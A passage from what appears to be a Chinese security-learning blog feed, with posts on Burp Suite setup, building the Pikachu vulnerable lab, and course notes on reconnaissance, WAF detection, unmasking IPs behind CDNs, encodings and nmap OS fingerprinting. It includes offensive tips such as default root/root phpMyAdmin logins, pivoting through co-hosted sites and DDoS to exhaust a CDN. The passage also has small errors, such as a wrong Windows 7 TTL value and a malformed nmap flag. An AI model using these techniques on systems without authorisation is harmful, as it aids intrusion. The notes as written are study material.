alt="image.png"></li><li>将小窗口第二栏的内容复制到大窗口的第二栏</li><li>大窗口第三栏会出现内容，复制粘贴到小窗口的第三栏</li><li>点击Next就安装完成了</li><li>再次打开<code>运行薄荷.vbs</code>就可以看到<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904210641.png" alt="image.png"></li><li>以后允许就打开这个</li><li>但是很难找所以可以给它创建一个快捷方式</li></ul><h1 id="浏览器配置"><a href="#浏览器配置" class="headerlink" title="浏览器配置"></a>浏览器配置</h1><ul><li>这里我选择的是火狐浏览器firefox<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212717.png" alt="image.png"></li><li>按照这个内容设置</li><li>其他浏览器的方法可以在网上找找，都差不多</li></ul><h1 id="CA证书"><a href="#CA证书" class="headerlink" title="CA证书"></a>CA证书</h1><ul><li>使用Burp Suite做安全测试时，要抓取HTTPS的包的话，是需要有Burp Suite的CA证书的，否则浏览器不支持。</li><li>使用BP导出CA证书<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212913.png" alt="image.png"></li><li>输入以下内容就可以<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212947.png" alt="image.png"></li><li>在burpsuite同级目录下就会出现证书文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213029.png" alt="image.png"></li><li>打开火狐浏览器，设置内搜索<code>证书</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213118.png" alt="image.png"></li><li>点击<code>导入...</code>，选择刚刚导出的证书即可<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213303.png" alt="image.png"></li><li>这样就算安装完成了</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场环境搭建</title>
      <link href="/2023/09/03/Pikachu%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/09/03/Pikachu%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<ul><li>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</li></ul><h1 id="第一步安装phpstudy"><a href="#第一步安装phpstudy" class="headerlink" title="第一步安装phpstudy"></a>第一步安装phpstudy</h1><ul><li>在<a href="https://www.xp.cn/download.html">phpstudy官网</a>下载安装<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903215830.png" alt="image.png"></li><li>这里只需要使用到Mysql和apache，所以打开这两个就可以了。</li><li>如果出现MySQL无法打开的情况，可以试试改变MySQL的连接端口，可能是电脑已存在MySQL并占用了默认的3306端口</li><li>测试一下是否开启成功，在浏览器打开<code>localhost/index.php</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903222109.png" alt="image.png"></li><li>出现以上页面则启动成功</li></ul><h1 id="第二步下载pikachu"><a href="#第二步下载pikachu" class="headerlink" title="第二步下载pikachu"></a>第二步下载pikachu</h1><ul><li>在GitHub当中下载<a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903220438.png" alt="image.png"></li></ul><h1 id="第三步搭建pikachu"><a href="#第三步搭建pikachu" class="headerlink" title="第三步搭建pikachu"></a>第三步搭建pikachu</h1><ul><li>在phpstudy中，左栏选择网站</li><li>在网站中创建一个127.0.0.1的网站</li><li>然后将下载的<code>pikachu.zip</code>压缩包解压到<code>phpstudy_pro/WWW/127.0.0.1</code>下</li><li>然后打开<code>pikachu-master/inc/conf.inc.php</code>文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903220851.png" alt="image.png"></li><li>按照指示修改内容</li></ul><h1 id="第四步pikachu！启动！"><a href="#第四步pikachu！启动！" class="headerlink" title="第四步pikachu！启动！"></a>第四步pikachu！启动！</h1><ul><li>在浏览器打开<code>127.0.0.1/pikachu-master</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903221106.png" alt="image.png"></li><li>可以看见pikachu已经成功打开了，但是还需要初始化</li><li>浏览器地址加上<code>/install.php</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903221252.png" alt="image.png"></li><li>点击<code>安装/初始化</code>就可以了</li></ul><h1 id="补充-我遇到的问题"><a href="#补充-我遇到的问题" class="headerlink" title="补充-我遇到的问题"></a>补充-我遇到的问题</h1><ol><li>一开始我将<code>pikachu-master</code>直接放在了WWW下，导致一直打不开页面，记得是放在<code>127.0.0.1</code>下</li><li>之后就是网站可以打开了，但是使用里面的内容会出现<code>数据连接失败，请仔细检查inc/config.inc.php的配置解决方法</code>，只是因为没有初始化就直接开始使用的情况，当时搞了好久才发现问题。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day08信息收集-架构，搭建，WAF等</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/"/>
      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<ul><li>在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。也可以很直接的跟大家说:渗透测试的思路就是从信息收集这里开始，你与大牛的差距也是从这里开始的!<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png"></li></ul><h1 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h1><h2 id="搭建习惯-目录型站点"><a href="#搭建习惯-目录型站点" class="headerlink" title="搭建习惯-目录型站点"></a>搭建习惯-目录型站点</h2><ul><li>简单的理解就是主站上面存在其他的cms程序</li><li>例如：</li><li>学生网站的上面通过后台扫描探针发现有一个bbs的目录一点击发现是一个bbs的论坛网站如：<code>www.xxx.com/bbs</code></li><li>我们把这个成为目录型网站、可以有两种找到漏洞的思路一个是主站的漏洞另外的一个是bbs上面的漏洞</li></ul><h2 id="搭建习惯-端口类站点"><a href="#搭建习惯-端口类站点" class="headerlink" title="搭建习惯-端口类站点"></a>搭建习惯-端口类站点</h2><ul><li>有的站点不是使用的是默认的站点80而是其他的端口，可以使用shodan这种工具去收集端口</li></ul><h2 id="搭建习惯-子域名站点"><a href="#搭建习惯-子域名站点" class="headerlink" title="搭建习惯-子域名站点"></a>搭建习惯-子域名站点</h2><ul><li>现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</li></ul><h2 id="搭建习惯-类似域名站点"><a href="#搭建习惯-类似域名站点" class="headerlink" title="搭建习惯-类似域名站点"></a>搭建习惯-类似域名站点</h2><ul><li>有些公司由于业务的发展将原来的域名弃用、选择了其他的域名但是我们访问他的旧的域名还是能够访问、有的是二级域名的更换而有的是顶级域名的更换</li><li>可以通过他的旧的域名找到一些突破口</li><li>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息</li></ul><h2 id="搭建习惯-旁注-c段站点"><a href="#搭建习惯-旁注-c段站点" class="headerlink" title="搭建习惯-旁注,c段站点"></a>搭建习惯-旁注,c段站点</h2><ul><li>旁注：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。</li><li>C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段最终拿下服务器、然后通过内网渗透的方式拿下渗透服务器。</li><li>在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li><li>通过旁注查询可以发现同一个服务器上面有两个站点可以通过对另外的一个站点进行突破。</li></ul><h2 id="搭建习惯-搭建软件特征站点"><a href="#搭建习惯-搭建软件特征站点" class="headerlink" title="搭建习惯-搭建软件特征站点"></a>搭建习惯-搭建软件特征站点</h2><ul><li>有的网站是借助于第三方的集成搭建工具实现例如：PHPstudy、宝塔等环境</li><li>这样的集成环境搭建的危害就是泄露了详细的版本信息。</li><li>phpstudy搭建了之后在默认的站点安装了phpmyadmin有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入</li></ul><h1 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h1><h2 id="什么是WAF应用"><a href="#什么是WAF应用" class="headerlink" title="什么是WAF应用"></a>什么是WAF应用</h2><ul><li>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</li></ul><h2 id="如何快速识别WAF"><a href="#如何快速识别WAF" class="headerlink" title="如何快速识别WAF"></a>如何快速识别WAF</h2><h3 id="采用工具wafwoof"><a href="#采用工具wafwoof" class="headerlink" title="采用工具wafwoof"></a>采用工具wafwoof</h3><ul><li>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a></li><li>安装之前一定要有python的环境不然安装不上<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20221934.png"></li><li>wafw00f的缺点判断的不是特别的准确存在误报或识别不出的情况。</li></ul><h3 id="检查元素"><a href="#检查元素" class="headerlink" title="检查元素"></a>检查元素</h3><ul><li>在有些网站的请求信息当中有的网站没有做安全信息上面留下了waf的相关信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/waf%E6%B5%8B%E8%AF%95.png"></li></ul><h3 id="使用nmap指纹检测"><a href="#使用nmap指纹检测" class="headerlink" title="使用nmap指纹检测"></a>使用nmap指纹检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script==http-waf-fingerprint</span><br><span class="line">nmap --script=http-waf-detec</span><br></pre></td></tr></table></figure><h2 id="识别wAF对于安全测试的意义"><a href="#识别wAF对于安全测试的意义" class="headerlink" title="识别wAF对于安全测试的意义"></a>识别wAF对于安全测试的意义</h2><ul><li>对于一个网站要是使用了waf而渗透人员没有识别直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问。而识别waf在于有针对性行的绕过各个厂商的waf可能存在着不同的绕过思路。</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day07信息收集-CDN绕过方法</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。 <img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/CDN.png"></li></ul><h1 id="如何判断目标存在CDN服务"><a href="#如何判断目标存在CDN服务" class="headerlink" title="如何判断目标存在CDN服务"></a>如何判断目标存在CDN服务</h1><ul><li>利用多节点技术进行请求返回判断</li><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20104946.png"></li><li>如果ping的结果只有一个那么就没有CDN、要是不止一个则可以判断为有CDN</li><li>没有使用CDN，例如<a href="http://www.xiaodi8.com/">www.xiaodi8.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20105039.png"></li><li>使用了CDN，例如<a href="http://www.baidu.com/">www.baidu.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20105112.png"></li></ul><h1 id="CDN对于安全测试有那些影响"><a href="#CDN对于安全测试有那些影响" class="headerlink" title="CDN对于安全测试有那些影响"></a>CDN对于安全测试有那些影响</h1><ul><li>cdn会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但cdn站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</li></ul><h1 id="目前常见的CDN绕过技术有哪些"><a href="#目前常见的CDN绕过技术有哪些" class="headerlink" title="目前常见的CDN绕过技术有哪些"></a>目前常见的CDN绕过技术有哪些</h1><h2 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h2><ul><li>因为有些网站为了节约成本，只为主站做了CDN服务，而子站没有，所以可以通过子站查询到IP地址</li></ul><h2 id="邮箱服务查询"><a href="#邮箱服务查询" class="headerlink" title="邮箱服务查询"></a>邮箱服务查询</h2><ul><li>很多公司都有内部邮箱，大部分都是内部人员访问，而且访问量不大，所以基本上都没有做CDN服务</li></ul><h2 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h2><ul><li>因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。</li></ul><h2 id="遗留文件"><a href="#遗留文件" class="headerlink" title="遗留文件"></a>遗留文件</h2><ul><li>如PHPinfo信息当中会遗留出ip地址</li></ul><h2 id="扫描全网"><a href="#扫描全网" class="headerlink" title="扫描全网"></a>扫描全网</h2><ul><li>从各个地区进行扫描IP，一般距离服务器近的不会使用CDN，即是真实IP</li></ul><h2 id="黑暗引擎搜索"><a href="#黑暗引擎搜索" class="headerlink" title="黑暗引擎搜索"></a>黑暗引擎搜索</h2><ul><li>fofa、傻蛋（shodan）、谛听、zoomeye、censys</li></ul><h2 id="特定文件dns历史记录"><a href="#特定文件dns历史记录" class="headerlink" title="特定文件dns历史记录"></a>特定文件dns历史记录</h2><ul><li>查看它没有使用CDN之前的IP地址记录，可能就是它的IP地址</li></ul><h2 id="以量打量"><a href="#以量打量" class="headerlink" title="以量打量"></a>以量打量</h2><ul><li>CDN节点的流量是有上限的，利用DDoS流量耗尽攻击，将流量耗尽就能直通原IP了</li><li>属于违法行为</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day06基础入门-加密算法</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展。</li></ul><h1 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h1><h2 id="加密软件"><a href="#加密软件" class="headerlink" title="加密软件"></a>加密软件</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20100158.png"></p><ul><li>解密网站<br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20100323.png"></li></ul><h2 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h2><ul><li>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</li><li>MD5等不可逆，这个网站不是通过常规枚举，而是通过已知</li></ul><h2 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h2><ul><li>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</li></ul><h2 id="常见解密方式（针对"><a href="#常见解密方式（针对" class="headerlink" title="常见解密方式（针对)"></a>常见解密方式（针对)</h2><ul><li>枚举，自定义逆向算法，可逆向</li></ul><h2 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h2><ul><li>长度位数，字符规律，代码分析，搜索获取等</li></ul><h1 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h1><ul><li>时间戳网站&lt;<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a>&gt;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20101017.png"></li><li>时间戳通常是用在用户的注册、登录、注销等情况</li></ul><h1 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h1><ul><li>url编码规则&lt;<a href="https://www.cnblogs.com/cxygg/p/9278542.html">https://www.cnblogs.com/cxygg/p/9278542.html</a>&gt;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20101811.png"></li></ul><h1 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h1><ul><li>base64编码的特点：随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号</li><li>一般在代码中为了安全会使用base64进行编码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102002.png"></li></ul><h1 id="unescape编码"><a href="#unescape编码" class="headerlink" title="unescape编码"></a>unescape编码</h1><ul><li>和URL编码有点像</li><li>特点：一般是%U+四个数字对应着两个字符、主要运用于网站web应用<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102141.png"></li></ul><h1 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h1><ul><li>AES在逐渐的取代md5值、在解密的过程中一定要知道密码和偏移量不然是借不出来的。</li><li>在线工具：<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102645.png"></li><li>密码是干扰项，会加入到文本当中，偏移量是加密的起始点</li><li>看起来是base64，但是对base64解密得到的是乱码</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day05基础入门-系统及数据库等</title>
      <link href="/2023/09/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/"/>
      <url>/2023/09/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<p>除去前期讲到过的搭建平台中间件，网站源码外，容易受到攻击的还有操作系统，数据库，第三方平台等，期中这类攻击也能直接影响到WEB或服务器的安全，导致网站或服务器权限的获取。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93.png"></p><h1 id="操作系统层面："><a href="#操作系统层面：" class="headerlink" title="操作系统层面："></a>操作系统层面：</h1><h2 id="识别操作系统的常见方法"><a href="#识别操作系统的常见方法" class="headerlink" title="识别操作系统的常见方法"></a>识别操作系统的常见方法</h2><h3 id="有网站"><a href="#有网站" class="headerlink" title="有网站"></a>有网站</h3><ul><li>可以通过网站的手工识别方法判断：</li><li>windows对大小写不敏感，也就是说你在网页中可以替换网站路径的大小写进行测试，如果改变大小写不会影响则可能是Windows的服务器，有影响则可能是Linux。</li></ul><h3 id="没网站"><a href="#没网站" class="headerlink" title="没网站"></a>没网站</h3><ul><li>通过nmap进行扫描：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O IP地址</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20141011.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Running (JUST GUESSING): Microsoft Windows 7|2008|Vista|8.1|2012 (96%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2012:r2</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 7 SP1 (96%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 or 2008 Beta 3 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)</span><br></pre></td></tr></table></figure></li><li>对服务器系统进行了识别，这个判断应该为<code>Microsoft Windows 7 SP1</code></li><li>备注：不是所有的系统都可以用这种方式扫描出操作系统的类型、在windows的一些高版本中无法探测，例如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">─<span class="comment"># nmap -O 10.1.1.129</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 21:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.1.1.129 (10.1.1.129)</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">MAC Address: 00:0C:29:DC:AF:EA (VMware)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=6/7%OT=80%CT=1%CU=36041%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM</span><br><span class="line">OS:=60BE1ADE%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%</span><br><span class="line">OS:SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5</span><br><span class="line">OS:B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)</span><br><span class="line">OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%</span><br><span class="line">OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=</span><br><span class="line">OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%</span><br><span class="line">OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=</span><br><span class="line">OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</span><br><span class="line">OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</span><br><span class="line">OS:T=80%CD=Z)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h3><p>不同的操作系统的默认TTL值是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也<strong>不一定准确</strong>。下面是默认操作系统的TTL：</p><ol><li>WINDOWS NT&#x2F;2000   TTL：128</li><li>WINDOWS 95&#x2F;98     TTL：32</li><li>UNIX              TTL：255</li><li>LINUX             TTL：64</li><li>WIN7           TTL：64<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20143750.png"></li></ol><ul><li>这个TTL&#x3D;110，接近与128，属于Windows NT&#x2F;2000</li></ul><h2 id="简要两者的区别及识别意义"><a href="#简要两者的区别及识别意义" class="headerlink" title="简要两者的区别及识别意义"></a>简要两者的区别及识别意义</h2><ul><li>系统文件的路径不同，Windows是分C盘、D盘等，而Linux的盘储存就不一样，等等。</li><li>已知服务器的操作系统是什么，就可以对症下药有针对性地围绕这个操作系统所支持地方面去发展。</li></ul><h2 id="操作系统层面漏洞类型对应意义"><a href="#操作系统层面漏洞类型对应意义" class="headerlink" title="操作系统层面漏洞类型对应意义"></a>操作系统层面漏洞类型对应意义</h2><ul><li>有些漏洞对于我们来说是没有意义的，只是会造成一些危害，但不会造成权限的丢失，只是影响了产品，没有获取到权限那就没太大意义。</li><li>不同的漏洞会造成不同漏洞利用的条件</li></ul><h2 id="简要操作系统层面漏洞影响范围"><a href="#简要操作系统层面漏洞影响范围" class="headerlink" title="简要操作系统层面漏洞影响范围"></a>简要操作系统层面漏洞影响范围</h2><ul><li>有些漏洞会对操作系统干扰造成崩溃、而有些系统只是蓝屏、或者是权限的提升</li></ul><h1 id="数据库层面："><a href="#数据库层面：" class="headerlink" 